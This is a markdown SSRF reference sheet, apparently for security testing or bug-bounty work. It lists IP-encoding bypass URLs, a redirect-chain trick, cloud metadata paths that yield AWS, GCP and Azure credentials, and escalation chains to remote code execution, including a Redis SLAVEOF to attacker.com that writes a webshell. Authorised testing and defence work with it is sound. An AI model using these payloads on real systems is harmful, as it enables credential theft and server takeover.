# Reference: web-vuln-ssrf

## IP Bypass Techniques

All 11 encoding formats for bypassing server-side IP blocklists (targeting `127.0.0.1` or `169.254.169.254`):

| Technique | Bypass URL | Notes |
|-----------|-----------|-------|
| `decimal` | `http://2130706433/` | 127.0.0.1 as decimal integer |
| `octal` | `http://0177.0.0.1/` | octal 0177 = 127 |
| `hex` | `http://0x7f.0x0.0x0.0x1/` | hex representation |
| `short_ip` | `http://127.1/` | abbreviated notation |
| `ipv6_loopback` | `http://[::1]/` | IPv6 loopback |
| `ipv6_mapped` | `http://[::ffff:127.0.0.1]/` | IPv4-mapped IPv6 |
| `ipv6_hex` | `http://[::ffff:0x7f000001]/` | mixed hex IPv6 |
| `url_encoded` | `http://%31%32%37%2e%30%2e%30%2e%31/` | URL-encoded octets |
| `double_encoded` | `http://%2531%2532%2537%2e%30%2e%30%2e%31/` | double URL-encoded |
| `at_symbol` | `http://attacker.com@127.0.0.1/` | parser confusion |
| `bracket` | `http://127.0.0.1:80#@evil.com/` | fragment abuse |

Redirect chain bypass: if external URLs are allowed, host a redirect at your server (`http://your-server/r` → 302 → `http://169.254.169.254/`) then supply `${PARAM}=http://your-server/r`. This bypasses most naive IP blocklists because the check runs on the original URL, not the redirect destination.

## Cloud Metadata Paths

### AWS IMDSv1

Base IP: `169.254.169.254` (no token required — most critical)

| Path | Purpose |
|------|---------|
| `/latest/meta-data/` | Root metadata listing |
| `/latest/meta-data/iam/security-credentials/` | Lists attached IAM role names |
| `/latest/meta-data/iam/security-credentials/<ROLE>` | Returns `AccessKeyId`, `SecretAccessKey`, `Token` |
| `/latest/meta-data/public-hostname` | EC2 public hostname |
| `/latest/meta-data/local-ipv4` | Private IP address |
| `/latest/user-data` | Instance user-data script (often contains secrets) |

AWS IMDSv2 requires a PUT preauth step (`PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds: 21600`) which is typically not chainable through SSRF. IMDSv1 (no token) is the primary target.

### GCP Metadata

Base URL: `http://metadata.google.internal` (requires `Metadata-Flavor: Google` header)

| Path | Purpose |
|------|---------|
| `http://metadata.google.internal/computeMetadata/v1/instance/` | Root instance metadata |
| `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` | OAuth2 access token for the default service account |
| `http://metadata.google.internal/computeMetadata/v1/project/project-id` | GCP project ID |

Note: If the SSRF fetcher forwards request headers from the attacker, the `Metadata-Flavor: Google` header becomes injectable even when the app does not include it itself.

### Azure IMDS

| Path | Purpose |
|------|---------|
| `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Full instance metadata (requires `Metadata: true` header) |

## Impact Classification and Chain Escalation

```
SSRF Impact Classification:
  DNS callback only                        -> Informational (DO NOT report alone)
  HTTP request to OOB host                 -> Low
  Internal service reachable (e.g. Redis)  -> Medium
  Admin panel or sensitive internal API    -> High
  Cloud metadata accessible                -> High
  Cloud IAM credentials extracted          -> Critical
  RCE via internal service (Docker/Redis)  -> Critical

Chain escalation paths:
  SSRF + AWS IMDSv1 -> extract AccessKeyId/SecretAccessKey -> AWS API RCE
  SSRF + internal port 2375 (Docker API) -> POST /containers/create -> RCE
  SSRF + internal Redis -> SLAVEOF attacker.com -> write webshell -> RCE
  SSRF + internal Elasticsearch -> dump all indices -> mass data breach
  SSRF + internal K8s (10250) -> /exec endpoint -> RCE on pods
```
